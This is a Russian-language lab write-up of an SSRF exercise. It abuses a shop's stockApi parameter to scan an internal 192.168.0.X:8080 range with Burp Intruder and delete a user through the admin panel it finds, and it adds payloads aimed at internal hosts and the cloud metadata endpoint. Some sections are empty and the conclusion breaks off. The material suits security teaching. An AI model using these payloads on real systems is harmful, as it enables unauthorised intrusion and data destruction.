<a id="goal"></a>

## 🎯 Цель

Использовать функцию проверки наличия товара (stock check) для:

```text
1. Сканирования внутреннего диапазона 192.168.0.X (порт 8080)
   в поисках админ-интерфейса.

2. Удаления пользователя carlos через найденный админ-интерфейс.
```

---

<a id="theory"></a>

## 🧠 Краткая теория

Приложение умеет обращаться к **внутренним бэкенд-системам**, которые недоступны пользователям напрямую. Такие системы:

- имеют **приватные не-маршрутизируемые IP**;
- «защищены» только сетевой топологией;
- поэтому часто имеют **слабую защиту** — внутренние сервисы нередко работают **без аутентификации**.

Пример из теории: на внутреннем хосте есть админ-интерфейс:

```text
http://192.168.0.68/admin
```

Запрос через уязвимый параметр:

```http
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://192.168.0.68/admin
```

Сервер выполняет запрос от своего имени и возвращает ответ внутренней системы пользователю.

---

<a id="idea"></a>

## 🧩 Ключевая идея

В этой лабе адрес внутреннего сервиса **неизвестен** — нужно его найти.

Атакующий не знает, на каком хосте из диапазона:

```text
192.168.0.1 ... 192.168.0.255
```

находится админка на порту:

```text
8080
```

Поэтому сервер используется как **прокси-сканер**: параметр `stockApi` перебирается по последнему октету IP с помощью Burp Intruder. Хост, вернувший статус `200` с телом админки, — цель.

---

<a id="ssrf"></a>

## 🔗 Что такое SSRF

SSRF — уязвимость, при которой сервер по воле атакующего отправляет HTTP-запросы **не туда**, куда задумано.

Ключевые сценарии:

```text
- запрос к самому серверу (localhost / 127.0.0.1);
- запрос к внутренним бэкендам в приватных сетях;
- запрос к облачным метаданным (169.254.169.254);
- сканирование внутренней сети через сервер.
```

Причина одна: **приложение доверяет пользовательскому вводу как адресу ресурса**.

---

<a id="trust"></a>

## 🤝 Доверие к внутренней сети

Внутренние системы «защищены» только тем, что внешние пользователи не могут до них достучаться. Но **приложение-сервер может**.

Разработчики внутренних сервисов рассуждают так:

```text
«Сеть приватная, снаружи не достучаться —
значит, внутри все запросы можно считать доверенными».
```

Результат: внутренние админки и API часто работают **без аутентификации**.

SSRF разрушает это допущение: атакующий использует сервер как мост между внешним миром и внутренней сетью:

```text
Атакующий ──✗──> 192.168.0.X:8080   (недоступно снаружи)

Атакующий ──(SSRF)──> Приложение ──(внутренний запрос)──> 192.168.0.X:8080 ✅
```

<a id="private-ip"></a>

## 🌐 Приватные IP-адреса

Приватные диапазоны не маршрутизируются в интернете:

```text
10.0.0.0/8        (10.0.0.0 – 10.255.255.255)
172.16.0.0/12     (172.16.0.0 – 172.31.255.255)
192.168.0.0/16    (192.168.0.0 – 192.168.255.255)
```

В лаборатории используется диапазон:

```text
192.168.0.X
```

Порт админки:

```text
8080
```

Нестандартные порты (8080, 8443, 8000) часто используются для внутренних сервисов — их легко пропустить при поверхностном тестировании.

<a id="stock-check"></a>

## 🛒 Как работает проверка наличия товара

Магазин показывает наличие товара на складе. Фронтенд передаёт серверу URL внутреннего API:

```text
POST /product/stock
stockApi=http://192.168.0.1:8080/product/stock/check?productId=1&storeId=1
```

Сервер ходит по этому URL и возвращает ответ пользователю.

Параметр `stockApi` — точка входа SSRF: пользователь контролирует **весь URL**.

---

<a id="vulnerable-flow"></a>

## ❌ Уязвимая логика

Упрощённо:

```python
stock_api = request.form["stockApi"]
response = http_client.get(stock_api)   # нет валидации URL
return response.body
```

Проблемы:

```text
1. URL принимается от пользователя без проверки.
2. Нет ограничения схемы и хоста.
3. Не блокируются приватные диапазоны IP.
4. Ответ внутреннего запроса возвращается пользователю.
```

<a id="step1"></a>

## 🔍 Шаг 1 — Перехватить запрос проверки наличия

1. Открыть страницу любого товара.
2. Запустить Burp Suite, включить перехват (Intercept on).
3. Нажать кнопку:

```text
Check stock
```

4. Перехватить запрос:

```http
POST /product/stock HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=...
Content-Type: application/x-www-form-urlencoded
Content-Length: 107

stockApi=http://192.168.0.1:8080/product/stock/check?productId=1&storeId=1
```

Внимание на параметр:

```text
stockApi
```

---

<a id="step2"></a>

## 🔍 Шаг 2 — Отправить запрос в Intruder и настроить позицию

1. Правый клик по запросу:

```text
Right click → Send to Intruder
```

2. Перейти во вкладку:

```text
Intruder
```

3. В параметре `stockApi` заменить значение на:

```text
stockApi=http://192.168.0.1:8080/admin
```

4. Выделить **последний октет IP** — цифру `1`:

```text
http://192.168.0.§1§:8080/admin
```

5. Нажать:

```text
Add §
```

Позиция атаки готова: перебираться будет только цифра `1`.

---

<a id="step3"></a>

## 🔍 Шаг 3 — Настроить Numbers-полезную нагрузку

В боковой панели:

```text
Payloads
```

выбрать тип полезной нагрузки:

```text
Numbers
```

и задать параметры:

```text
From:   1
To:     255
Step:   1
```

Это сгенерирует значения для последнего октета:

```text
1, 2, 3, ..., 255
```

То есть будут просканированы хосты:

```text
192.168.0.1 ... 192.168.0.255
```

---

<a id="step4"></a>

## 🔍 Шаг 4 — Запустить атаку

Нажать:

```text
Start attack
```

Intruder отправит 255 запросов:

```text
GET /admin HTTP/1.1
Host: 192.168.0.X:8080
```

через уязвимый параметр `stockApi`.

После завершения появится таблица результатов с колонками:

```text
Request   Payload   Status   Length   ...
```

---

<a id="step5"></a>

## 🔍 Шаг 5 — Найти админ-интерфейс по статусу 200

Отсортировать результаты по колонке:

```text
Status
```

по возрастанию.

Единственная запись со статусом:

```text
200
```

— это хост с админ-интерфейсом.

Другие хосты вернут:

```text
404   (сервис есть, но /admin не существует)
500   (ошибка)
```

Вывод: админка найдена на `http://192.168.0.X:8080/admin`.

---

<a id="step6"></a>

## 🔍 Шаг 6 — Удалить пользователя `carlos` в Repeater

1. Кликнуть по успешному запросу со статусом `200`.
2. Отправить его в Repeater:

```text
Right click → Send to Repeater
```

3. Изменить путь в `stockApi`:

```text
stockApi=http://192.168.0.X:8080/admin/delete?username=carlos
```

4. Нажать:

```text
Send
```

Лаборатория получает статус:

```text
Solved
```

<a id="breakdown"></a>

## 🔬 Почему атака сработала

### 1. Пользователь контролирует полный URL

`stockApi` принимает произвольный URL без валидации.

### 2. Сервер находится внутри сети

Приложение может обращаться к приватным адресам `192.168.0.X`, недоступным снаружи.

### 3. Внутренние сервисы доверяют источнику запроса

Админка на порту 8080 работает без аутентификации — она «защищена» только топологией.

### 4. Ответ возвращается атакующему

SSRF не слепой: содержимое админки приходит в HTTP-ответе.

### 5. Intruder позволяет сканировать диапазон

Перебор последнего октета превращает сервер в сканер внутренней сети.

### 6. Найденная админка даёт деструктивное действие

Через `/admin/delete?username=carlos` пользователь удаляется.

<a id="intruder"></a>

## 🎯 Как работает Intruder в этой атаке

Burp Intruder автоматизирует отправку серии запросов с разными значениями в отмеченных позициях.

В этой лабе:

```text
Позиция:       последний октет IP (192.168.0.§1§:8080/admin)
Payload type:  Numbers
Диапазон:      1–255 с шагом 1
Результат:     255 запросов, по одному на каждый хост диапазона
```

Поиск цели:

```text
Статус 200 → админ-интерфейс найден
Статус 404 → хост есть, но /admin отсутствует
Статус 500 → сервис отвечает ошибкой
```

Совет: тело ответа тоже стоит проверить — у найденного хоста должен быть HTML админки (заголовок, список пользователей, ссылки удаления).

## 🧠 Как думать как пентестер

Когда находишь SSRF-точку, не останавливайся на `localhost`:

```text
Какие приватные диапазоны может достать сервер?
```

```text
Какие порты слушают внутренние сервисы (8080, 8443, 8000)?
```

```text
Можно ли сканировать диапазон через Intruder или скрипт?
```

```text
Есть ли на внутренних системах чувствительные функции без аутентификации?
```

Признаки SSRF-точки:

```text
stockApi   url    path   dest   redirect   uri
load       src    link   next   image_url  callback
```

## 🧪 Дополнительные проверки

В рамках разрешённой лаборатории можно сравнить:

### Прямой доступ к внутреннему адресу (недоступен)


### SSRF на конкретный хост

```text
stockApi=http://192.168.0.68:8080/admin
```

```text
stockApi=http://192.168.0.68:80/admin
stockApi=http://192.168.0.68:8443/admin
```

```text
stockApi=http://10.0.0.1/admin

```

```text
stockApi=http://169.254.169.254/latest/meta-data/
```

Рабочее решение для данной лабы:

```text
1. Intruder: 192.168.0.§1§:8080/admin, Numbers 1–255

```

<a id="mistakes"></a>

## ❌ Типичные ошибки

### Ошибка 1. Сканировать не тот порт

Админка слушает порт `8080`, а не стандартный `80`.

### Ошибка 2. Выделить не тот октет

Позиция должна быть на **последнем** октете IP (`192.168.0.§1§`), а не на другом числе.

### Ошибка 3. Неправильные параметры Numbers

`From: 1`, `To: 255`, `Step: 1` — иначе диапазон будет неполным или слишком большим.

### Ошибка 4. Смотреть не на ту колонку

Сортировать по `Status` и искать `200`, а не самую длинную запись или первый ответ.

### Ошибка 5. Проверять только статус, игнорируя тело

`200` должен сопровождаться HTML админки — иначе это просто другой сервис.

### Ошибка 6. Забыть изменить путь в Repeater

В Repeater нужно заменить путь на `/admin/delete?username=carlos`, а не отправлять тот же `/admin`.

### Ошибка 7. Не обновить Content-Length

При ручном изменении тела запроса следить, что `Content-Length` соответствует новому телу (в Repeater Burp обновляет его автоматически по умолчанию).

### Ошибка 8. Слишком много потоков

Для 255 запросов стандартных настроек достаточно; агрессивные настройки потоков могут вызвать срабатывание защит.

<a id="defense"></a>

## 🛡 Защита

### 1. Не принимать URL от пользователя

Использовать серверный allowlist внутренних эндпоинтов:

```python
allowed_apis = {
    "stock": "http://internal-stock-api:8080/check",
}
api = allowed_apis[user_input]
```

### 2. Блокировать приватные адреса

```text
127.0.0.0/8        loopback
10.0.0.0/8         приватные
172.16.0.0/12      приватные
192.168.0.0/16     приватные
169.254.169.254    облачные метаданные
```

### 3. Валидировать схему и хост

Разрешать только `http`/`https` и только разрешённые домены, а не любые IP.

### 4. Защита от DNS rebinding

Резолвить hostname, проверять IP, выполнять запрос именно на этот IP.

### 5. Аутентифицировать внутренние сервисы

Внутренние админки и API не должны доверять запросам только из-за сетевого расположения.

### 6. Сегментация сети и egress-фильтрация

Ограничить, куда приложение может ходить (network policy, firewall).

### 7. Не возвращать ответы внутренних систем

Если запрос нельзя запретить — хотя бы не отражать его ответ пользователю (снижает информативность, но не убирает уязвимость).

### 8. Логировать исходящие запросы

Фиксировать URL, по которым ходит сервер, чтобы обнаружить сканирование.

<a id="conclusion"></a>

## 🧾 Итог

Лаборатория решена через SSRF-атаку на **внутренний бэкенд-сервис**:

